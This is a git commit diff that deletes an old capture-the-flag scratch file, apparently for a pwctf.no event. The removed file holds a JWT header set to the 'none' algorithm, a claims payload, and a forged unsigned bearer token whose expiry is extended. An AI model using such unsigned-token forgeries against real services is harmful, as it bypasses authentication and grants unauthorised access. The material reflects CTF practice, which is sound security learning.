114187dbf00608daf74badb9c256c27f069d8337
krloer <kriloneri@gmail.com>
2022-10-11 23:12:01 +0200

    Deleted some old folders

--- bedpresPWC/test.py
+++
@@ -1,7 +0,0 @@
-{"alg":"none","typ":"JWT"}
-{"iss":"pwctf.no","aud":"pwctf.no","iat":1635690221,"exp":1635799221,"uid":"120a9afe-e0c7-4176-bef8-a19bf8695a2c"}
-
-
-
-
-Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJwd2N0Zi5ubyIsImF1ZCI6InB3Y3RmLm5vIiwiaWF0IjoxNjM1NjkwMjIxLCJleHAiOjI2MzU2OTkyMjEsInVpZCI6IjEyMGE5YWZlLWUwYzctNDE3Ni1iZWY4LWExOWJmODY5NWEyYyJ9."
